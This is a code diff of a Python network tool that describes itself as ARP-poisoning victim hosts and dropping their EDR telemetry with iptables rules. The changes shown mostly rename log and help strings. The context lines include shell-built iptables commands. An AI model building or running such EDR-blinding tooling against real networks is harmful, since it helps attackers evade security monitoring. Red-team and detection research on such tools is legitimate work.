@@ -28,14 +28,14 @@ def read_block_list(file_path):
 
 def add_iptables_rule(ip, monitor_mode, server_name):
     if monitor_mode:
-        logging.info(f"Blocked domain found: {server_name}")
+        logging.info(f"Blocked server name found: {server_name}")
         logging.info(f"{YELLOW}[+] Detected blocked IP: {ip}{ENDC}")
     else:
         try:
             rule_exists = subprocess.call(f"iptables -C FORWARD -d {ip} -j DROP  > /dev/null 2>&1", shell=True)
             if rule_exists != 0:
                 subprocess.call(f"iptables -A FORWARD -d {ip} -j DROP", shell=True)
-                logging.info(f"Blocked domain found: {server_name}")
+                logging.info(f"Blocked server name found: {server_name}")
                 logging.info(f"{GREEN}[+] iptables rule added for: {ip}{ENDC}")
         except Exception as e:
             logging.error(f"Failed to add iptables rule for {ip}: {str(e)}")
@@ -117,9 +117,9 @@ def signal_handler(sig, frame):
     os._exit(0)
 
 def main():
-    parser = argparse.ArgumentParser(description="Sniff TLS Client Hello packets and block specified domains.")
+    parser = argparse.ArgumentParser(description="Performs ARP Poisoning against victim host(s) and blocks EDR telemetry by utilising iptables.")
     parser.add_argument("-i", "--interface", required=True, help="Network interface to sniff on")
-    parser.add_argument("-f", "--file", required=True, help="File containing the list of blocked domains")
+    parser.add_argument("-f", "--file", required=True, help="File containing the list of blocked server names or a part of names")
     parser.add_argument("-m", "--monitor", action="store_true", help="Monitor mode: only detect and log blocked IPs, do not add iptables rules")
     parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
     parser.add_argument("-t", "--target", required=True, help="Target IP address or range (e.g., 192.168.0.1-10 or 192.168.0.1,192.168.0.2 (no space)")
@@ -135,7 +135,7 @@ def main():
     else:
         logging.basicConfig(level=logging.INFO)
 
-    logging.info(f"Blocked domain strings {blocked_domains}")
+    logging.info(f"Blocked server name strings {blocked_domains}")
     logging.info("Running EDR telemetry filtering...")
 
     enable_ip_forwarding()
